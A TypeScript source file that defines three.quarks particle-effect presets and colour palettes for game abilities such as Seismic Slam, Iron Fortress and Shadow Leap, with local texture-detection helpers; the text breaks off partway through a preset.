import { createRequire } from 'module';
const require = createRequire(import.meta.url);
﻿// @ts-nocheck
import * as THREE from 'three';
import {
    ParticleSystem,
    PointEmitter,
    CircleEmitter,
    ConeEmitter,
    SphereEmitter,
    DonutEmitter,
    ConstantValue,
    IntervalValue,
    ConstantColor,
    ColorRange,
    Gradient,
    RenderMode,
    SizeOverLife,
    SizeBySpeed,
    ColorOverLife,
    ColorBySpeed,
    WidthOverLength,
    OrbitOverLife,
    SpeedOverLife,
    RotationOverLife,
    ForceOverLife,
    TurbulenceField,
    Bezier,
    PiecewiseBezier,
} from 'three.quarks';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { existsSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

type PresetBuilder = () => ParticleSystem;

type TextureKey = 'dust' | 'ribbon' | 'spark' | 'smoke' | 'ring' | 'streak' | 'ember';
type TextureMap = Record<TextureKey, string>;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const CLIENT_ROOT = path.resolve(__dirname, '../../..');
const SRC_PRESET_DIR = path.resolve(__dirname);
const PUBLIC_PRESET_DIR = path.resolve(CLIENT_ROOT, 'public/vfx/presets');

const TEXTURE_CANDIDATE_DIRS = [
    path.resolve(CLIENT_ROOT, 'public/assets/vfx'),
    path.resolve(CLIENT_ROOT, 'src/assets/vfx'),
    path.resolve(CLIENT_ROOT, 'assets/vfx'),
];

const PLACEHOLDER_TEXTURES: TextureMap = {
    dust: '/assets/vfx/TODO_dust.png',
    ribbon: '/assets/vfx/TODO_ribbon.png',
    spark: '/assets/vfx/TODO_spark.png',
    smoke: '/assets/vfx/TODO_smoke.png',
    ring: '/assets/vfx/TODO_ring.png',
    streak: '/assets/vfx/TODO_streak.png',
    ember: '/assets/vfx/TODO_ember.png',
};

// Color palette tokens per ability â€” spectator-readable, thematically distinct.
const C = {
    // Seismic Slam â€” forge-earth, magma crack
    SEISMIC_DUST: [[1.0, 0.72, 0.28, 1.0], [0.72, 0.38, 0.12, 0.8], [0.22, 0.12, 0.04, 0]] as Array<[number, number, number, number]>,
    SEISMIC_ROCK: [[0.9, 0.78, 0.55, 1.0], [0.55, 0.42, 0.28, 0.6], [0.18, 0.12, 0.06, 0]] as Array<[number, number, number, number]>,
    SEISMIC_GLOW: [[1.0, 0.9, 0.5, 1.0], [1.0, 0.55, 0.05, 0.9], [0.6, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    // Iron Fortress â€” deep ocean blue / UV hex shield
    FORT_SHIELD: [[0.55, 0.95, 1.0, 0.85], [0.18, 0.62, 1.0, 0.55], [0.04, 0.18, 0.55, 0]] as Array<[number, number, number, number]>,
    FORT_SPARK: [[1.0, 1.0, 1.0, 1.0], [0.42, 0.88, 1.0, 0.9], [0.05, 0.35, 0.8, 0]] as Array<[number, number, number, number]>,
    FORT_RING: [[0.7, 1.0, 1.0, 0.7], [0.25, 0.75, 1.0, 0.4], [0.05, 0.2, 0.6, 0]] as Array<[number, number, number, number]>,
    // Gale Force â€” keep existing (user-approved)
    GALE: [[0.78, 0.96, 1.0, 0.7], [0.5, 0.8, 1.0, 0.35], [0.22, 0.45, 0.72, 0]] as Array<[number, number, number, number]>,
    // Sky-Fire Strike â€” white-hot plasma â†’ thermite orange
    SKY_TELE: [[1.0, 0.95, 0.4, 0.35], [1.0, 0.48, 0.08, 0.62], [0.7, 0.1, 0.0, 0]] as Array<[number, number, number, number]>,
    SKY_BEAM: [[1.0, 1.0, 0.9, 1.0], [1.0, 0.72, 0.12, 0.95], [0.5, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    SKY_RAIN: [[1.0, 0.96, 0.72, 1.0], [1.0, 0.48, 0.08, 0.88], [0.28, 0.08, 0.0, 0]] as Array<[number, number, number, number]>,
    // Shadow Leap â€” void purple / corruption warp
    SHADOW: [[0.82, 0.18, 1.0, 0.85], [0.42, 0.05, 0.72, 0.55], [0.0, 0.0, 0.12, 0]] as Array<[number, number, number, number]>,
    SHADOW_VOID: [[0.25, 0.0, 0.45, 0.9], [0.08, 0.0, 0.18, 0.45], [0.0, 0.0, 0.0, 0]] as Array<[number, number, number, number]>,
    // Basilisk Gaze â€” neuro-toxic green / alien freeze
    BASILISK: [[0.42, 1.0, 0.28, 1.0], [0.82, 0.38, 1.0, 0.85], [0.08, 0.05, 0.18, 0]] as Array<[number, number, number, number]>,
    BASILISK2: [[0.72, 1.0, 0.45, 0.9], [0.18, 0.88, 0.55, 0.6], [0.02, 0.18, 0.08, 0]] as Array<[number, number, number, number]>,
    // Battering Ram â€” molten chrome collision
    RAM_SPEED: [[1.0, 0.98, 0.82, 0.72], [1.0, 0.62, 0.08, 0.5], [0.8, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    RAM_IMPACT: [[1.0, 1.0, 0.9, 1.0], [1.0, 0.58, 0.08, 0.9], [0.35, 0.12, 0.0, 0]] as Array<[number, number, number, number]>,
    // Unstoppable Herd â€” divine gold
    HERD_AURA: [[1.0, 0.98, 0.52, 0.9], [1.0, 0.72, 0.08, 0.6], [0.45, 0.22, 0.0, 0]] as Array<[number, number, number, number]>,
    HERD_DUST: [[1.0, 0.88, 0.65, 0.55], [0.72, 0.55, 0.32, 0.3], [0.28, 0.2, 0.12, 0]] as Array<[number, number, number, number]>,
    HERD_SPARK: [[1.0, 1.0, 0.7, 1.0], [1.0, 0.78, 0.18, 0.85], [0.55, 0.3, 0.0, 0]] as Array<[number, number, number, number]>,
    // Neuro-Toxin Cloud â€” mutant slime
    TOXIN: [[0.62, 1.0, 0.22, 0.68], [0.22, 0.82, 0.12, 0.42], [0.05, 0.22, 0.02, 0]] as Array<[number, number, number, number]>,
    TOXIN2: [[0.88, 1.0, 0.42, 0.5], [0.45, 1.0, 0.18, 0.28], [0.08, 0.28, 0.04, 0]] as Array<[number, number, number, number]>,
    // Scrap Magnet â€” sci-fi teal gravity well
    MAGNET: [[0.62, 1.0, 1.0, 0.9], [0.18, 0.82, 1.0, 0.55], [0.02, 0.25, 0.5, 0]] as Array<[number, number, number, number]>,
    MAGNET_PULL: [[1.0, 1.0, 1.0, 1.0], [0.55, 0.98, 1.0, 0.8], [0.08, 0.45, 0.8, 0]] as Array<[number, number, number, number]>,
    // Junk Turret â€” scrap orange electric
    TURRET_CAST: [[1.0, 0.88, 0.28, 1.0], [1.0, 0.48, 0.05, 0.85], [0.38, 0.12, 0.0, 0]] as Array<[number, number, number, number]>,
    TURRET_LOOP: [[0.55, 1.0, 0.88, 0.82], [0.18, 0.85, 1.0, 0.5], [0.02, 0.28, 0.45, 0]] as Array<[number, number, number, number]>,
    TURRET_HIT: [[1.0, 0.98, 0.72, 1.0], [1.0, 0.65, 0.12, 0.85], [0.42, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    // Scavengers' Feast â€” glitchy neon green data
    FEAST_CAST: [[0.38, 1.0, 0.55, 1.0], [0.12, 0.92, 0.38, 0.75], [0.02, 0.25, 0.08, 0]] as Array<[number, number, number, number]>,
    FEAST_LOOP: [[0.55, 1.0, 0.42, 0.78], [0.18, 0.85, 0.28, 0.45], [0.02, 0.2, 0.06, 0]] as Array<[number, number, number, number]>,
    // Forge Link â€” molten iron orange tether
    FORGE_CAST: [[1.0, 0.88, 0.42, 1.0], [1.0, 0.52, 0.08, 0.85], [0.45, 0.15, 0.0, 0]] as Array<[number, number, number, number]>,
    FORGE_LOOP: [[1.0, 0.72, 0.22, 0.82], [0.88, 0.38, 0.05, 0.55], [0.35, 0.1, 0.0, 0]] as Array<[number, number, number, number]>,
    FORGE_HIT: [[1.0, 0.95, 0.65, 1.0], [1.0, 0.6, 0.1, 0.9], [0.5, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    // Sky-Eye Recon â€” ice blue scanner
    RECON_CAST: [[0.72, 0.96, 1.0, 0.95], [0.22, 0.72, 1.0, 0.65], [0.05, 0.22, 0.55, 0]] as Array<[number, number, number, number]>,
    RECON_LOOP: [[0.85, 1.0, 1.0, 0.7], [0.38, 0.85, 1.0, 0.4], [0.08, 0.28, 0.65, 0]] as Array<[number, number, number, number]>,
    // Stampede Overdrive â€” blazing gold charge
    STOMP_CAST: [[1.0, 0.95, 0.45, 1.0], [1.0, 0.68, 0.08, 0.85], [0.48, 0.22, 0.0, 0]] as Array<[number, number, number, number]>,
    STOMP_LOOP: [[1.0, 0.88, 0.32, 0.8], [0.95, 0.55, 0.05, 0.5], [0.4, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
    STOMP_IMPACT: [[1.0, 1.0, 0.82, 1.0], [1.0, 0.72, 0.18, 0.9], [0.38, 0.15, 0.0, 0]] as Array<[number, number, number, number]>,
    STOMP_TRAIL: [[1.0, 0.82, 0.52, 0.6], [0.72, 0.48, 0.12, 0.35], [0.28, 0.18, 0.0, 0]] as Array<[number, number, number, number]>,
};

function grad(stops: Array<[number, number, number, number]>): Gradient {
    const color = stops.map(([r, g, b], i) => [new THREE.Vector3(r, g, b), i / Math.max(1, stops.length - 1)] as [THREE.Vector3, number]);
    const alpha = stops.map(([, , , a], i) => [a, i / Math.max(1, stops.length - 1)] as [number, number]);
    return new Gradient(color, alpha);
}


function sizeGrowFadeCurve(): PiecewiseBezier {
    return new PiecewiseBezier([
        [new Bezier(0.0, 0.28, 0.95, 0.75), 0.55],
        [new Bezier(0.75, 0.45, 0.2, 0.0), 1],
    ]);
}

function sizeSteadyFadeCurve(): PiecewiseBezier {
    return new PiecewiseBezier([
        [new Bezier(0.75, 0.85, 0.95, 1.0), 0.7],
        [new Bezier(1.0, 0.6, 0.25, 0.0), 1],
    ]);
}

function material(hex: number, additive = false): THREE.MeshBasicMaterial {
    return new THREE.MeshBasicMaterial({
        color: hex,
        transparent: true,
        opacity: 1,
        depthWrite: false,
        side: THREE.DoubleSide,
        blending: additive ? THREE.AdditiveBlending : THREE.NormalBlending,
    });
}

function discGeom(): THREE.BufferGeometry {
    return new THREE.CircleGeometry(0.5, 18);
}

function ringGeom(): THREE.BufferGeometry {
    return new THREE.RingGeometry(0.28, 0.5, 20);
}

function shardGeom(): THREE.BufferGeometry {
    return new THREE.TetrahedronGeometry(0.45, 0);
}

function chunkGeom(): THREE.BufferGeometry {
    return new THREE.DodecahedronGeometry(0.38, 0);
}

function metaScaffold(): Record<string, Record<string, unknown>> {
    return {
        geometries: {},
        materials: {},
        textures: {},
        images: {},
        nodes: {},
        shapes: {},
        animations: {},
    };
}

function detectTextures(): { root: string | null; textures: TextureMap; missing: TextureKey[] } {
    const root = TEXTURE_CANDIDATE_DIRS.find((d) => existsSync(d)) ?? null;
    if (!root) {
        return { root: null, textures: { ...PLACEHOLDER_TEXTURES }, missing: Object.keys(PLACEHOLDER_TEXTURES) as TextureKey[] };
    }
    const pick = (key: TextureKey, patterns: RegExp[]): string => {
        const files = ['.png', '.webp', '.jpg', '.jpeg']
            .flatMap((ext) => patterns.map((p) => p.source.replace('$', `${ext}$`)))
            .map((s) => new RegExp(s, 'i'));
        const dirFiles = safeReadDir(root);
        const hit = dirFiles.find((f) => files.some((rx) => rx.test(f)));
        return hit ? `/assets/vfx/${hit}` : PLACEHOLDER_TEXTURES[key];
    };
    const textures: TextureMap = {
        dust: pick('dust', [/dust$/, /debris$/, /sand$/]),
        ribbon: pick('ribbon', [/ribbon$/, /soft$/, /wind$/]),
        spark: pick('spark', [/spark$/, /impact$/, /flash$/]),
        smoke: pick('smoke', [/smoke$/, /fog$/, /cloud$/]),
        ring: pick('ring', [/ring$/, /circle$/, /telegraph$/]),
        streak: pick('streak', [/streak$/, /line$/, /speed$/]),
        ember: pick('ember', [/ember$/, /glow$/, /aura$/]),
    };
    const missing = (Object.keys(textures) as TextureKey[]).filter((k) => textures[k].startsWith('/assets/vfx/TODO_'));
    return { root, textures, missing };
}

function safeReadDir(absDir: string): string[] {
    try {
        return readdirSync(absDir);
    } catch {
        return [];
    }
}

function writeSystemPreset(name: string, build: PresetBuilder) {
    const system = build();
    const emitterJson = system.emitter.toJSON() as Record<string, any>;
    const metadata = metaScaffold();
    const psJson = system.toJSON(metadata, { useUrlForImage: true });
    if (emitterJson.object && typeof emitterJson.object === 'object') {
        emitterJson.object.ps = psJson;
    }
    return {
        name,
        json: emitterJson,
    };
}

function burst(count: number, t = 0): { time: number; count: ReturnType<typeof ConstantValue.prototype.toJSON> extends never ? never : ConstantValue; cycle: number; interval: number; probability: number } {
    return { time: t, count: new ConstantValue(count), cycle: 1, interval: 0.01, probability: 1 } as any;
}

function buildPresets(_textures: TextureMap): Array<{ name: string; json: unknown }> {
    return [
        // â”€â”€â”€ SEISMIC SLAM â”€â”€â”€ Giant magma ground-crack + massive debris eruption â”€â”€â”€
        writeSystemPreset('seismic_slam_dust_burst', () => new ParticleSystem({
            looping: false, duration: 0.12, worldSpace: true, maxParticle: 600,
            shape: new CircleEmitter({ radius: 2.8, arc: Math.PI * 2, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(600)],
            startLife: new IntervalValue(0.5, 1.4),
            startSpeed: new IntervalValue(4.5, 14.0),
            startSize: new IntervalValue(0.18, 0.72),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.78, 0.22, 1), new THREE.Vector4(0.8, 0.38, 0.05, 0.85)),
            material: material(0xff9e22, true),
            renderMode: RenderMode.Mesh, instancingGeometry: chunkGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.SEISMIC_DUST)),
                new RotationOverLife(new IntervalValue(-12, 12)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-22, -8), new ConstantValue(0)),
                new TurbulenceField(new THREE.Vector3(6, 3, 6), 3, new THREE.Vector3(1.5, 0.5, 1.5), new THREE.Vector3(0.4, 0.2, 0.4)),
            ],
        })),

        // â”€â”€â”€ IRON FORTRESS â”€â”€â”€ Sci-fi hex energy dome â”€â”€â”€
        writeSystemPreset('iron_fortress_dome_cast', () => new ParticleSystem({
            looping: false, duration: 0.22, worldSpace: false, maxParticle: 280,
            shape: new SphereEmitter({ radius: 4.5, thickness: 0.08 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(280)],
            startLife: new IntervalValue(0.35, 0.9),
            startSpeed: new IntervalValue(0.05, 0.25),
            startSize: new IntervalValue(0.14, 0.55),
            startColor: new ColorRange(new THREE.Vector4(0.42, 0.92, 1.0, 1.0), new THREE.Vector4(0.08, 0.5, 1.0, 0.85)),
            material: material(0x44e8ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.FORT_SHIELD)),
                new RotationOverLife(new IntervalValue(-6, 6)),
            ],
        })),
        writeSystemPreset('iron_fortress_dome_loop', () => new ParticleSystem({
            looping: true, duration: 2.0, worldSpace: false, maxParticle: 400,
            shape: new CircleEmitter({ radius: 4.5, arc: Math.PI * 2, thickness: 0.04 }),
            emissionOverTime: new ConstantValue(200),
            emissionBursts: [],
            startLife: new IntervalValue(1.2, 2.2),
            startSpeed: new IntervalValue(0.02, 0.08),
            startSize: new IntervalValue(0.12, 0.38),
            startColor: new ColorRange(new THREE.Vector4(0.55, 0.95, 1.0, 0.72), new THREE.Vector4(0.18, 0.6, 1.0, 0.4)),
            material: material(0x2ad4ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.FORT_RING)),
                new OrbitOverLife(new IntervalValue(1.5, 3.5), new THREE.Vector3(0, 1, 0)),
            ],
        })),
        writeSystemPreset('iron_fortress_block_hit', () => new ParticleSystem({
            looping: false, duration: 0.15, worldSpace: false, maxParticle: 180,
            shape: new CircleEmitter({ radius: 3.8, arc: Math.PI, thickness: 0.12 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(180)],
            startLife: new IntervalValue(0.18, 0.52),
            startSpeed: new IntervalValue(1.5, 5.5),
            startSize: new IntervalValue(0.1, 0.48),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 1.0, 1.0), new THREE.Vector4(0.42, 0.88, 1.0, 0.85)),
            material: material(0xa8f0ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.FORT_SPARK)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-5, -2), new ConstantValue(0)),
            ],
        })),

        // â”€â”€â”€ GALE FORCE â”€â”€â”€ (user-approved â€” unchanged core, upgraded params) â”€â”€â”€
        writeSystemPreset('gale_force_wind_cone', () => new ParticleSystem({
            looping: false, duration: 0.36, worldSpace: false, maxParticle: 380,
            shape: new ConeEmitter({ radius: 0.22, angle: 12 }),
            emissionOverTime: new ConstantValue(220),
            emissionBursts: [burst(60)],
            startLife: new IntervalValue(0.26, 0.62),
            startSpeed: new IntervalValue(12.0, 22.0),
            startSize: new IntervalValue(0.09, 0.34),
            startColor: new ColorRange(new THREE.Vector4(0.95, 1, 1, 0.9), new THREE.Vector4(0.55, 0.88, 1, 0.55)),
            material: material(0xb8f8ff, true),
            renderMode: RenderMode.StretchedBillBoard,
            rendererEmitterSettings: { speedFactor: 1.0, lengthFactor: 4.2 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.GALE)),
                new ColorBySpeed(grad([[1, 1, 1, 1], [0.52, 0.9, 1, 0.8], [0.22, 0.6, 1, 0.35]]), new IntervalValue(10, 22)),
                new SizeBySpeed(new IntervalValue(0.6, 1.4), new IntervalValue(10, 22)),
                new RotationOverLife(new IntervalValue(-5, 5)),
            ],
        })),
        writeSystemPreset('gale_force_push_hit', () => new ParticleSystem({
            looping: false, duration: 0.28, worldSpace: true, maxParticle: 220,
            shape: new SphereEmitter({ radius: 0.4, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(220)],
            startLife: new IntervalValue(0.2, 0.65),
            startSpeed: new IntervalValue(5.0, 16.0),
            startSize: new IntervalValue(0.07, 0.28),
            startColor: new ColorRange(new THREE.Vector4(1, 1, 1, 1), new THREE.Vector4(0.5, 0.88, 1, 0.7)),
            material: material(0xd0f8ff, true),
            renderMode: RenderMode.StretchedBillBoard,
            rendererEmitterSettings: { speedFactor: 1.2, lengthFactor: 3.0 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.GALE)),
            ],
        })),

        // â”€â”€â”€ SKY-FIRE STRIKE â”€â”€â”€ Real airstrike: ground telegraph â†’ thunderbolt beam â†’ thermite rain â”€â”€â”€
        writeSystemPreset('sky_fire_telegraph_circle', () => new ParticleSystem({
            looping: true, duration: 1.5, worldSpace: false, maxParticle: 120,
            shape: new DonutEmitter({ radius: 3.8, donutRadius: 0.22, thickness: 0.4 }),
            emissionOverTime: new ConstantValue(80),
            emissionBursts: [],
            startLife: new IntervalValue(1.3, 1.8),
            startSpeed: new IntervalValue(0.01, 0.06),
            startSize: new IntervalValue(0.6, 1.8),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.85, 0.22, 0.5), new THREE.Vector4(1.0, 0.32, 0.04, 0.35)),
            material: material(0xff8800, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.SKY_TELE)),
                new RotationOverLife(new IntervalValue(2.0, 4.5)),
            ],
        })),
        writeSystemPreset('sky_fire_strike_cast', () => new ParticleSystem({
            looping: false, duration: 0.18, worldSpace: true, maxParticle: 500,
            shape: new SphereEmitter({ radius: 0.5, thickness: 0.6 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(500)],
            startLife: new IntervalValue(0.25, 1.1),
            startSpeed: new IntervalValue(6.0, 28.0),
            startSize: new IntervalValue(0.06, 0.38),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.85, 1), new THREE.Vector4(1.0, 0.62, 0.08, 1)),
            material: material(0xffe066, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.6, lengthFactor: 3.5 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.SKY_BEAM)),
                new ColorBySpeed(grad([[1, 1, 0.9, 1], [1, 0.72, 0.12, 0.9], [0.55, 0.18, 0, 0.4]]), new IntervalValue(6, 28)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-30, -14), new ConstantValue(0)),
            ],
        })),
        writeSystemPreset('sky_fire_thermite_rain', () => new ParticleSystem({
            looping: false, duration: 0.45, worldSpace: true, maxParticle: 320,
            shape: new SphereEmitter({ radius: 3.2, thickness: 0.85 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(320)],
            startLife: new IntervalValue(0.3, 0.95),
            startSpeed: new IntervalValue(2.0, 9.0),
            startSize: new IntervalValue(0.05, 0.25),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.95, 0.75, 1), new THREE.Vector4(1.0, 0.45, 0.05, 0.9)),
            material: material(0xffa020, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.SKY_RAIN)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-28, -16), new ConstantValue(0)),
            ],
        })),

        // â”€â”€â”€ SHADOW LEAP â”€â”€â”€ Void-warp: dark corruption singularity + purple distortion â”€â”€â”€
        writeSystemPreset('shadow_leap_trail_cast', () => new ParticleSystem({
            looping: false, duration: 0.22, worldSpace: true, maxParticle: 360,
            shape: new SphereEmitter({ radius: 0.55, thickness: 1.0 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(360)],
            startLife: new IntervalValue(0.3, 1.1),
            startSpeed: new IntervalValue(1.5, 7.5),
            startSize: new IntervalValue(0.06, 0.32),
            startColor: new ColorRange(new THREE.Vector4(0.88, 0.12, 1.0, 0.95), new THREE.Vector4(0.22, 0.0, 0.45, 0.6)),
            material: material(0xaa00ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.SHADOW)),
                new OrbitOverLife(new IntervalValue(-18, 18), new THREE.Vector3(0, 1, 0)),
                new TurbulenceField(new THREE.Vector3(5, 3, 5), 3, new THREE.Vector3(2.5, 1.2, 2.5), new THREE.Vector3(0.8, 1.4, 0.8)),
            ],
        })),
        writeSystemPreset('shadow_form_loop', () => new ParticleSystem({
            looping: true, duration: 1.2, worldSpace: false, maxParticle: 220,
            shape: new SphereEmitter({ radius: 0.65, thickness: 1.0 }),
            emissionOverTime: new ConstantValue(185),
            emissionBursts: [],
            startLife: new IntervalValue(0.28, 0.85),
            startSpeed: new IntervalValue(0.4, 2.2),
            startSize: new IntervalValue(0.05, 0.22),
            startColor: new ColorRange(new THREE.Vector4(0.72, 0.06, 1.0, 0.8), new THREE.Vector4(0.12, 0.0, 0.28, 0.35)),
            material: material(0x8800cc, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.SHADOW_VOID)),
                new OrbitOverLife(new IntervalValue(-8, 8), new THREE.Vector3(0, 1, 0)),
                new TurbulenceField(new THREE.Vector3(3, 2, 3), 2, new THREE.Vector3(1.8, 0.9, 1.8), new THREE.Vector3(0.6, 1.0, 0.6)),
            ],
        })),
        writeSystemPreset('shadow_leap_arrive_hit', () => new ParticleSystem({
            looping: false, duration: 0.2, worldSpace: true, maxParticle: 300,
            shape: new DonutEmitter({ radius: 0.9, donutRadius: 0.35, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(300)],
            startLife: new IntervalValue(0.2, 0.7),
            startSpeed: new IntervalValue(3.0, 11.0),
            startSize: new IntervalValue(0.08, 0.38),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.6, 1.0, 1), new THREE.Vector4(0.45, 0.0, 0.82, 0.75)),
            material: material(0xdd44ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.SHADOW)),
                new RotationOverLife(new IntervalValue(-14, 14)),
            ],
        })),

        // â”€â”€â”€ BASILISK GAZE â”€â”€â”€ Neuro-venom freeze ring + mind-control pulse â”€â”€â”€
        writeSystemPreset('basilisk_gaze_hit', () => new ParticleSystem({
            looping: false, duration: 0.25, worldSpace: true, maxParticle: 340,
            shape: new DonutEmitter({ radius: 1.2, donutRadius: 0.5, thickness: 0.85 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(340)],
            startLife: new IntervalValue(0.4, 1.2),
            startSpeed: new IntervalValue(2.5, 10.0),
            startSize: new IntervalValue(0.1, 0.65),
            startColor: new ColorRange(new THREE.Vector4(0.38, 1.0, 0.28, 1), new THREE.Vector4(0.85, 0.22, 1.0, 0.8)),
            material: material(0x55ff44, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.BASILISK)),
                new OrbitOverLife(new IntervalValue(-12, 12), new THREE.Vector3(0, 1, 0)),
                new TurbulenceField(new THREE.Vector3(4, 2, 4), 3, new THREE.Vector3(1.2, 0.6, 1.2), new THREE.Vector3(0.5, 0.8, 0.5)),
            ],
        })),
        writeSystemPreset('basilisk_pulse_cast', () => new ParticleSystem({
            looping: false, duration: 0.55, worldSpace: false, maxParticle: 240,
            shape: new DonutEmitter({ radius: 0.5, donutRadius: 0.3, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(240)],
            startLife: new IntervalValue(0.35, 1.1),
            startSpeed: new IntervalValue(2.5, 6.5),
            startSize: new IntervalValue(0.18, 0.88),
            startColor: new ColorRange(new THREE.Vector4(0.5, 1.0, 0.38, 1), new THREE.Vector4(0.78, 0.3, 1.0, 0.85)),
            material: material(0x88ff44, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.BASILISK2)),
                new RotationOverLife(new IntervalValue(-9, 9)),
            ],
        })),

        // â”€â”€â”€ BATTERING RAM â”€â”€â”€ Hypersonic charge trail + wall-demolishing explosion â”€â”€â”€
        writeSystemPreset('battering_ram_charge_cast', () => new ParticleSystem({
            looping: true, duration: 0.28, worldSpace: true, maxParticle: 480,
            shape: new ConeEmitter({ radius: 0.32, angle: 6 }),
            emissionOverTime: new ConstantValue(1700),
            emissionBursts: [],
            startLife: new IntervalValue(0.1, 0.28),
            startSpeed: new IntervalValue(14.0, 32.0),
            startSize: new IntervalValue(0.06, 0.22),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.88, 0.85), new THREE.Vector4(1.0, 0.55, 0.05, 0.62)),
            material: material(0xffdd80, true),
            renderMode: RenderMode.Trail,
            rendererEmitterSettings: { startLength: new ConstantValue(1.8), followLocalOrigin: false },
            autoDestroy: false,
            behaviors: [
                new WidthOverLength(new Bezier(0.12, 0.9, 0.75, 0)),
                new ColorOverLife(grad(C.RAM_SPEED)),
                new RotationOverLife(new IntervalValue(-3, 3)),
            ],
        })),
        writeSystemPreset('battering_ram_impact_hit', () => new ParticleSystem({
            looping: false, duration: 0.2, worldSpace: true, maxParticle: 550,
            shape: new SphereEmitter({ radius: 1.0, thickness: 0.7 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(550)],
            startLife: new IntervalValue(0.2, 0.85),
            startSpeed: new IntervalValue(5.0, 24.0),
            startSize: new IntervalValue(0.06, 0.42),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.92, 1), new THREE.Vector4(1.0, 0.52, 0.04, 0.9)),
            material: material(0xffcc44, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.5, lengthFactor: 3.2 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.RAM_IMPACT)),
                new ColorBySpeed(grad([[1, 1, 0.9, 1], [1, 0.65, 0.1, 0.88], [0.5, 0.15, 0, 0.4]]), new IntervalValue(5, 24)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-12, -5), new ConstantValue(0)),
            ],
        })),

        // â”€â”€â”€ UNSTOPPABLE HERD â”€â”€â”€ Divine stampede â€” radiant golden war-god shockwave â”€â”€â”€
        writeSystemPreset('unstoppable_herd_cast', () => new ParticleSystem({
            looping: false, duration: 0.18, worldSpace: true, maxParticle: 400,
            shape: new CircleEmitter({ radius: 2.0, arc: Math.PI * 2, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(400)],
            startLife: new IntervalValue(0.4, 1.2),
            startSpeed: new IntervalValue(3.0, 12.0),
            startSize: new IntervalValue(0.12, 0.55),
